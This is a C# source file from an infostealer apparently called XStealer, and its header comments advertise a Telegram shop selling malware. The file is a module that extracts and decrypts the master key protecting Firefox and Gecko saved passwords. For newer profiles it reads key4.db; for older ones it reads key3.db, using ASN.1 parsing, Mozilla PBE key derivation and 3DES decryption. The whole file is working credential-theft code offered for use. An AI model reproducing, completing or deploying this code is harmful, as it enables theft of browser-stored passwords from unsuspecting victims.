// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Gecko
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Linq;
    using System.Security.Cryptography;
    using Helpers;

    public static class GBox
    {
        #region Binary key to decrypt the key from passwords | Бинарный ключ для расшифровки ключа от паролей
        public static readonly byte[] Key4MagicNumber = new byte[16] { 248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 };
        #endregion

        #region Key processing | Обработка ключа
        private static string HandlingKey(BerkeleyDB berDB, Func<string, bool> predicate)
        {
            string text = string.Empty;
            try
            {
                foreach (KeyValuePair<string, string> key in berDB.Keys?.Where(key => predicate(key.Key)))
                {
                    text = key.Value;
                }
            }
            catch { }
            return text?.Replace("-", string.Empty);
        }
        #endregion

        #region Getting P4 key | Получение P4 ключа

        /// <summary>
        /// Метод для получения расшифрованного ключа key4.db
        /// </summary>
        /// <param name="file">Путь к key4.db базе</param>
        /// <returns></returns>
        public static byte[] Get_P4k(string file)
        {
            // Имена таблиц
            const string TABLEDATA = "metaData", TABLENSS = "nssPrivate", FIELD_ITEM_ONE = "item1", FIELD_ITEM_TWO = "item2)";
            const string FIELD_A_ONE_HUNDTWO = "a102", FIELD_A_ELEVEN = "a11", FIELD_PASS = "password-check";

            // Буффер размера ключа
            var result = new byte[24];
            if (!File.Exists(file)) { return result; }

            try
            {
                // Подключение к базе
                var database = new SqliteEx().ReadTableFromTemp(file, TABLEDATA);
                // Получение зашифрованных полей
                string pass_Item = database.GetValue(0, FIELD_ITEM_ONE), fEight_Item = database.GetValue(0, FIELD_ITEM_TWO);
                // Парсинг
                Asn1DerObject f800001 = Asn1Der.Parse(ConverterEx.ToBytes(true, fEight_Item));
                byte[] entrySalt = f800001.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
                byte[] cipherT = f800001.Objects[0].Objects[1].ObjectData;
                // Расшифровка данных
                var CheckPwd = new MozillaPBE(ConverterEx.ToBytes(true, pass_Item), ConverterEx.ToBytes(true, string.Empty), entrySalt); CheckPwd?.Compute();
                string decryptedPwdChk = DecoderEx.TripDes_Decrypt(CheckPwd.DataKey, CheckPwd.DataIV, cipherT);
                // Проверка пароля
                if (!decryptedPwdChk.StartsWith(FIELD_PASS)) { return null; }
                database.ReadTable(TABLENSS); // Чтение nss
                // Перебор значений
                int rowLength = database.GetRowCount();
                string s3 = string.Empty;
                for (int i = 0; i < rowLength; i++)
                {
                    if (database.GetValue(i, FIELD_A_ONE_HUNDTWO) != ConverterEx.ToString(true, Key4MagicNumber)) { continue; }
                    s3 = database.GetValue(i, FIELD_A_ELEVEN); break;
                }
                // Парсинг 
                Asn1DerObject decodedA11 = Asn1Der.Parse(ConverterEx.ToBytes(true, s3));
                entrySalt = decodedA11.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
                cipherT = decodedA11.Objects[0].Objects[1].ObjectData;
                // Расшифровка
                CheckPwd = new MozillaPBE(ConverterEx.ToBytes(true, pass_Item), ConverterEx.ToBytes(true, string.Empty), entrySalt); CheckPwd?.Compute();
                result = ConverterEx.ToBytes(true, DecoderEx.TripDes_Decrypt(CheckPwd.DataKey, CheckPwd.DataIV, cipherT, PaddingMode.PKCS7));
                return result; // Возврат расшифрованного ключа
            }
            catch { return result; }
        }
        #endregion

        #region Getting P3 key for old Mozilla | Получение P3 ключа для старой мозиллы

        /// <summary>
        /// Метод для получения расшифрованного ключа key3.db
        /// </summary>
        /// <param name="file">Путь к key3.db базе</param>
        /// <returns></returns>
        internal static byte[] Get_Old_P3k(string file)
        {
            const string PWD = "password-check", VER = "Version", SALT = "global-salt";

            var privateKey = new byte[24]; 
            if (!File.Exists(file)) { return privateKey; }

            try
            {
                var berkeleyDB = new BerkeleyDB(file);
                // Проверка мастер-пароль
                var pwdCheck = new PasswordCheck(HandlingKey(berkeleyDB, (string x) => x.Equals(PWD)));
                string GlobalSalt = HandlingKey(berkeleyDB, (string x) => x.Equals(SALT));
                var CheckPwd = new MozillaPBE(ConverterEx.StringToByteArray(GlobalSalt), ConverterEx.ToBytes(true, string.Empty), ConverterEx.StringToByteArray(pwdCheck.EntrySalt)); CheckPwd?.Compute();
                string decryptF800001 = DecoderEx.TripDes_Decrypt(CheckPwd.DataKey, CheckPwd.DataIV, ConverterEx.StringToByteArray(pwdCheck.Passwordcheck));
                if (!decryptF800001.StartsWith(PWD)) { return null; }
                // Получение приватного ключа
                Asn1DerObject pars_f81 = Asn1Der.Parse(ConverterEx.StringToByteArray(HandlingKey(berkeleyDB, (string x) => !x.Equals(PWD) && !x.Equals(VER) && !x.Equals(SALT))));
                var CheckPrivateKey = new MozillaPBE(ConverterEx.StringToByteArray(GlobalSalt), ConverterEx.ToBytes(true, string.Empty), pars_f81.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData); CheckPrivateKey?.Compute();
                Asn1DerObject f800001deriv1 = Asn1Der.Parse(ConverterEx.ToBytes(true, DecoderEx.TripDes_Decrypt(CheckPrivateKey.DataKey, CheckPrivateKey.DataIV, pars_f81.Objects[0].Objects[1].ObjectData)));
                Asn1DerObject f800001deriv2 = Asn1Der.Parse(f800001deriv1.Objects[0].Objects[2].ObjectData);
                if (f800001deriv2.Objects[0].Objects[3].ObjectData.Length > 24)
                {
                    Array.Copy(f800001deriv2.Objects[0].Objects[3].ObjectData, f800001deriv2.Objects[0].Objects[3].ObjectData.Length - 24, privateKey, 0, 24);
                }
                else { privateKey = f800001deriv2.Objects[0].Objects[3].ObjectData; }
                return privateKey; // Возврат расшифрованного ключа
            }
            catch (Exception) { return privateKey; }
        }
        #endregion
    }
}